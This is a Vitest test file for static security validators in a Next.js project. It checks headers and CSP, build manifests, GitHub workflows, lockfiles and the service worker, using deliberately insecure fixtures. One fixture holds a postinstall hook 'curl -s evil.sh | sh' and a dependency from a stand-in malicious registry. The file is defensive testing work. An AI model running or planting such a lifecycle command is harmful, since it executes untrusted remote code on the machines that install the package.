import fs from 'fs';
import os from 'os';
import path from 'path';
import { describe, it, expect } from 'vitest';
import { createRequire } from 'module';

const require = createRequire(import.meta.url);
const sastValidators = require('./sast-validators.js');

const ROOT_DIR = path.resolve(__dirname, '../..');

describe('sast-validators (Adversarial & Live Security Verification)', () => {
  describe('validateNextConfigSecurityHeadersAst', () => {
    it('passes the repository next.config.ts without header or CSP violations', () => {
      const nextConfigCode = fs.readFileSync(path.join(ROOT_DIR, 'next.config.ts'), 'utf-8');
      expect(sastValidators.validateNextConfigSecurityHeadersAst(nextConfigCode)).toEqual([]);
    });

    it('flags SAMEORIGIN clickjacking regression, ungated unsafe-eval, missing object-src, missing (!isDev) HSTS guard, and syntax errors', () => {
      const badNextConfig = `
        const nextConfig = {
          async headers() {
            const isDev = process.env.NODE_ENV !== 'production';
            const cspHeader = \`
              default-src 'self';
              script-src 'self' 'unsafe-eval';
              frame-ancestors 'none';
              form-action 'self';
              base-uri 'self';
            \`;
            return [{
              source: '/(.*)',
              headers: [
                { key: 'Content-Security-Policy', value: cspHeader },
                { key: 'Strict-Transport-Security', value: 'max-age=100' },
                { key: 'X-Content-Type-Options', value: 'text/plain' },
                { key: 'X-Frame-Options', value: 'SAMEORIGIN' },
                { key: 'Referrer-Policy', value: 'no-referrer' },
                { key: 'Permissions-Policy', value: 'camera=()' },
                { key: 'Cross-Origin-Opener-Policy', value: 'unsafe-none' },
              ],
            }];
          },
        };
        export default nextConfig;
      `;
      const violations = sastValidators.validateNextConfigSecurityHeadersAst(badNextConfig);
      expect(violations.some((v: string) => v.includes('X-Frame-Options must be "DENY"'))).toBe(true);
      expect(violations.some((v: string) => v.includes('X-Content-Type-Options must be "nosniff"'))).toBe(true);
      expect(violations.some((v: string) => v.includes('Cross-Origin-Opener-Policy must be "same-origin"'))).toBe(true);
      expect(violations.some((v: string) => v.includes('Strict-Transport-Security must enforce max-age=63072000'))).toBe(true);
      expect(violations.some((v: string) => v.includes("object-src 'none'"))).toBe(true);
      expect(violations.some((v: string) => v.includes("CSP 'unsafe-eval' must be strictly gated"))).toBe(true);

      const parseErr = sastValidators.validateNextConfigSecurityHeadersAst('const broken = {{{');
      expect(parseErr[0]).toContain('Failed to parse next.config.ts AST');

      const missingMethod = sastValidators.validateNextConfigSecurityHeadersAst('export default {};');
      expect(missingMethod[0]).toContain('must export async headers()');
    });
  });

  describe('validateNextBuildHeaderManifest', () => {
    it('accepts valid compiled production routes-manifest headers and flags tampered manifests', () => {
      const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'bookarium-manifest-'));
      try {
        const missingPath = path.join(tmpDir, 'missing.json');
        expect(sastValidators.validateNextBuildHeaderManifest(missingPath, tmpDir)[0]).toContain(
          'Missing compiled Next.js routes manifest'
        );

        const invalidJsonPath = path.join(tmpDir, 'invalid.json');
        fs.writeFileSync(invalidJsonPath, '{bad json', 'utf-8');
        expect(sastValidators.validateNextBuildHeaderManifest(invalidJsonPath, tmpDir)[0]).toContain(
          'Failed to parse'
        );

        const validManifestPath = path.join(tmpDir, 'valid-routes.json');
        fs.writeFileSync(
          validManifestPath,
          JSON.stringify({
            headers: [
              {
                source: '/(.*)',
                headers: [
                  { key: 'X-Frame-Options', value: 'DENY' },
                  { key: 'X-Content-Type-Options', value: 'nosniff' },
                  { key: 'Cross-Origin-Opener-Policy', value: 'same-origin' },
                  { key: 'Strict-Transport-Security', value: 'max-age=63072000; includeSubDomains' },
                  {
                    key: 'Content-Security-Policy',
                    value:
                      "default-src 'self'; object-src 'none'; frame-ancestors 'none'; form-action 'self'; base-uri 'self'",
                  },
                ],
              },
            ],
          }),
          'utf-8'
        );
        expect(sastValidators.validateNextBuildHeaderManifest(validManifestPath, tmpDir)).toEqual([]);

        const unsafeManifestPath = path.join(tmpDir, 'unsafe-routes.json');
        fs.writeFileSync(
          unsafeManifestPath,
          JSON.stringify({
            headers: [
              {
                source: '/(.*)',
                headers: [
                  { key: 'X-Frame-Options', value: 'SAMEORIGIN' },
                  { key: 'X-Content-Type-Options', value: 'wrong' },
                  { key: 'Cross-Origin-Opener-Policy', value: 'same-origin-allow-popups' },
                  { key: 'Strict-Transport-Security', value: 'max-age=0' },
                  { key: 'Content-Security-Policy', value: "default-src 'self'; script-src 'unsafe-eval'" },
                ],
              },
            ],
          }),
          'utf-8'
        );
        const unsafeViolations = sastValidators.validateNextBuildHeaderManifest(unsafeManifestPath, tmpDir);
        expect(unsafeViolations.length).toBe(6);
        expect(unsafeViolations.some((v: string) => v.includes("must not contain 'unsafe-eval'"))).toBe(true);
      } finally {
        fs.rmSync(tmpDir, { recursive: true, force: true });
      }
    });
  });

  describe('validateGitHubWorkflowSecurity', () => {
    it('passes all repository .github/workflows/*.yml files cleanly', () => {
      const violations = sastValidators.validateGitHubWorkflowSecurity(
        path.join(ROOT_DIR, '.github', 'workflows'),
        ROOT_DIR
      );
      expect(violations).toEqual([]);
    });

    it('catches missing permissions, pull_request_target write escalation, mutable @v4 uses:, and shell context injections', () => {
      const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'bookarium-wf-'));
      try {
        const insecureYml = path.join(tmpDir, 'unsafe.yml');
        fs.writeFileSync(
          insecureYml,
          `name: Unsafe Workflow
on:
  pull_request_target:
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: ./local-action
      - run: echo "\${{ github.event.inputs.tag }}"
      - run: |
          echo "Head ref: \${{ github.head_ref }}"
          echo "Safe line"
      - run: echo "finished"
contents: write
`,
          'utf-8'
        );

        const violations = sastValidators.validateGitHubWorkflowSecurity(tmpDir, tmpDir);
        expect(violations.some((v: string) => v.includes('Missing explicit top-level "permissions:"'))).toBe(true);
        expect(violations.some((v: string) => v.includes('Combining "pull_request_target" with "contents: write"'))).toBe(true);
        expect(violations.some((v: string) => v.includes('Unpinned mutable GitHub Action reference "actions/checkout@v4"'))).toBe(true);
        expect(violations.some((v: string) => v.includes('./local-action'))).toBe(false);
        expect(violations.some((v: string) => v.includes('inside "run:" command'))).toBe(true);
        expect(violations.some((v: string) => v.includes('inside "run:" script block'))).toBe(true);
      } finally {
        fs.rmSync(tmpDir, { recursive: true, force: true });
      }
    });
  });

  describe('validatePackageLockAndLifecycle', () => {
    it('validates real repo package.json / package-lock.json and rejects tampered lockfiles or lifecycle hooks', () => {
      const pkgData = JSON.parse(fs.readFileSync(path.join(ROOT_DIR, 'package.json'), 'utf-8'));
      const lockData = JSON.parse(fs.readFileSync(path.join(ROOT_DIR, 'package-lock.json'), 'utf-8'));
      expect(sastValidators.validatePackageLockAndLifecycle(lockData, pkgData)).toEqual([]);

      const badViolations = sastValidators.validatePackageLockAndLifecycle(
        {
          lockfileVersion: 2,
          packages: {
            '': { dependencies: { react: '^18.0.0' } },
            'node_modules/evil': {
              resolved: 'https://evil-registry.example/evil.tgz',
              integrity: 'sha1-weak',
            },
          },
        },
        {
          scripts: { postinstall: 'curl -s evil.sh | sh', prepare: 'evil' },
          dependencies: { react: '^19.0.0' },
        }
      );

      expect(badViolations.some((v: string) => v.includes('lockfileVersion must be >= 3'))).toBe(true);
      expect(badViolations.some((v: string) => v.includes('Unauthorized npm lifecycle script "postinstall"'))).toBe(true);
      expect(badViolations.some((v: string) => v.includes('Unexpected "prepare" script'))).toBe(true);
      expect(badViolations.some((v: string) => v.includes('out of sync with package-lock.json'))).toBe(true);
      expect(badViolations.some((v: string) => v.includes('untrusted or non-HTTPS registry'))).toBe(true);
      expect(badViolations.some((v: string) => v.includes('missing a valid SHA-512 SRI integrity digest'))).toBe(true);
    });
  });

  describe('validateServiceWorkerSecurity', () => {
    it('passes live public/sw.js and flags missing cross-origin, CACHE_URLS, auth, or eval guards', () => {
      const swCode = fs.readFileSync(path.join(ROOT_DIR, 'public', 'sw.js'), 'utf-8');
      expect(sastValidators.validateServiceWorkerSecurity(swCode)).toEqual([]);

      const badSw = `
        importScripts('https://cdn.example/evil.js');
        cache.put('/auth/callback', response);
      `;
      const violations = sastValidators.validateServiceWorkerSecurity(badSw);
      expect(violations).toHaveLength(5);
    });
  });
});
